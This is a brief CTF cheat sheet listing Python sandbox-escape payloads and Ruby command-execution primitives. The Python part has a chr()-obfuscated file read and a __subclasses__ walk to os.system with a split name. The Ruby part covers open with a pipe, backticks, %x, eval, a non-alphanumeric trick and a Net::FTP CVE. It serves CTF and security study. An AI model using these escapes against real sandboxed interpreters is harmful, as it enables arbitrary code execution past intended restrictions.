## Python jailbreak

- Method 1
```
int(open("flag.txt", "r").read())
```

- Method 2
```
chr(105) + chr(110) + chr(116) + chr(40) + chr(111) + chr(112) + chr(101) + chr(110) + chr(40) + chr(39) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116) + chr(39) + chr(44) + chr(32) + chr(39) + chr(114) + chr(39) + chr(41) + chr(46) + chr(114) + chr(101) + chr(97) + chr(100) + chr(40) + chr(41) + chr(41)
```

- Method 3 `<class 'os._wrap_close'> is 132`
```
print("".__class__.__mro__[1].__subclasses__())
"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['s' + 'ys' + 'tem']('ls -la')

```

## Ruby Command Executing

- `open("| ls")`
- `IO.popen("ls").read`
- `Kernel.exec("ls")`
- ``` `ls` ```
- `system("ls")`
- `eval("ruby code")`
    - Non-Alphanumeric example: [HITCON CTF 2015 - Hard to say](https://github.com/w181496/CTF/tree/master/hitcon2015/hard-to-say)
        - `$$/$$` => 1
        - `'' << 97 << 98 << 99` => "abc"
        - `$:`即`$LOAD_PATH`
- `exec("ls")`
- `%x{ls}`
- Net::FTP
    - CVE-2017-17405
    - use `Kernel#open`

